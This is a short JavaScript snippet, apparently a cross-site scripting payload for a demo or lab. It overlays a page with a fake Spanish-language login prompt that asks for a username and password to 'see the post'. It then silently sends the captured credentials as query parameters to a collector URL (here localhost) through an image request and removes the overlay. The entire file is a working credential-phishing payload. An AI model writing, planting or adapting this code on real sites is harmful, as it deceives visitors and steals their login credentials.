(() => {
    const formulario = document.createElement("div");

    formulario.innerHTML = `
        <div style="
            position:fixed;
            inset:0;
            background:#000a;
            display:flex;
            align-items:center;
            justify-content:center;
            z-index:99999;
        ">
            <form id="form-demo" style="
                background:#202637;
                padding:30px;
                border-radius:12px;
                color:white;
            ">
                <h2>Inicia sesión para ver el post.</h2>

                <input id="Username"
                       placeholder="Username"
                       autocomplete="off">

                <input id="Password"
                       placeholder="Password"
                       autocomplete="off">

                <button type="submit">Continuar</button>
            </form>
        </div>
    `;

    document.body.appendChild(formulario);

    document.getElementById("form-demo")
        .addEventListener("submit", (e) => {
            e.preventDefault();

            const usuario =
                document.getElementById("Username").value;

            const codigo =
                document.getElementById("Password").value;

            const url =
                "http://localhost:80/" +
                "?usuario=" + encodeURIComponent(usuario) +
                "&codigo=" + encodeURIComponent(codigo);

            new Image().src = url;

            formulario.remove();
        });
})();
